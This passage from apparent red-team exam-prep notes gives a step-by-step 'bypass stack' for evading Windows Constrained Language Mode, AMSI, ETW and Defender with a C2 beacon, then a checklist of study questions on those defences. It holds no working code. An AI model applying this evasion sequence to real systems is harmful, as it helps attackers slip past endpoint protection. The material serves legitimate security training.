  → YES: payload hash may be checked — ensure uniqueness
  → NO (air-gapped): local signatures only — easier to evade
```

**The complete bypass stack for a maximally hardened environment:**

```
1. Land initial access (phishing, web exploit, etc.)
2. Check defenses → CLM active + AMSI active + Defender ON + Tamper ON
3. Deploy C2 beacon (if initial access was non-beacon)
4. C2 beacon patches AMSI in its own process (beacon handles this)
5. C2 beacon patches ETW in its own process (beacon handles this)
6. Use execute-assembly for all .NET tools (avoids CLM entirely)
7. Avoid writing tools to disk (avoids WdFilter.sys)
8. If must touch disk: find exclusions, write there
9. If must use PowerShell: use Invisi-Shell launched from beacon shell
```

---

## Mastery Checklist — CLM & AMSI & Defender Architecture

You understand these topics at exam-ready depth when you can answer every question without notes:

**Constrained Language Mode:**
- [ ] What is the difference between FullLanguage and ConstrainedLanguage mode?
- [ ] Name three specific .NET operations that CLM blocks
- [ ] Why does AppLocker's presence cause PowerShell to enter CLM?
- [ ] Why does PowerShell v2 downgrade bypass CLM? What is the design gap?
- [ ] Why does execute-assembly bypass CLM? Where does CLM enforcement live?
- [ ] What is the difference between AppLocker enforcement and WDAC enforcement?
- [ ] Name two .NET Framework binaries (LOLBins) that execute C# outside of PowerShell
- [ ] How does a custom runspace bypass CLM?

**AMSI Architecture:**
- [ ] Name the three participants in the AMSI architecture (host, DLL, provider)
- [ ] Why does amsi.dll run inside the PowerShell process and not as an external service?
- [ ] What is the security consequence of this in-process design?
- [ ] Where are AMSI providers registered? (What registry path?)
- [ ] What is the name of Defender's AMSI provider DLL?
- [ ] When AmsiScanBuffer returns HRESULT error, what does PowerShell do?
- [ ] Does AMSI scan content in .NET CLR processes (not PowerShell)?
- [ ] Can multiple AMSI providers be active simultaneously?
- [ ] What is the AMSI bypass paradox? Why do bypasses get caught?
- [ ] How does string obfuscation solve the paradox?

**AMSI Bypass Targeting:**
- [ ] Which part of the AMSI architecture does the AmsiScanBuffer patch target?
- [ ] Which part does the amsiInitFailed reflection bypass target?
- [ ] Which part does Invisi-Shell target?
- [ ] Which part does string obfuscation target?
- [ ] What byte values does the AmsiScanBuffer patch write? What do they mean?

**Defender Architecture:**
- [ ] Name the six layers of Defender's architecture
- [ ] What does MsMpEng.exe do? What privilege does it run as?
- [ ] What does WdFilter.sys do? Why must it be in kernel mode?
- [ ] What does MpOav.dll do? Where does it run?
- [ ] What does MAPS (cloud protection) do? Why does this matter in air-gapped environments?
- [ ] What is Tamper Protection? What does it prevent?
- [ ] Why can you still patch AMSI even with Tamper Protection on?
- [ ] What are Defender exclusions? How do you enumerate them?
- [ ] Name the three detection types (signature, heuristic, behavioral)
- [ ] How do you determine WHICH detection type caught your payload?

**Compound Problem:**
- [ ] Why does AMSI bypass Method 1 fail when CLM is active?
- [ ] Why does AMSI bypass Method 2 fail when CLM is active?
- [ ] What is the recommended escape route when both CLM and AMSI are active?
- [ ] Draw the complete evasion decision tree from memory
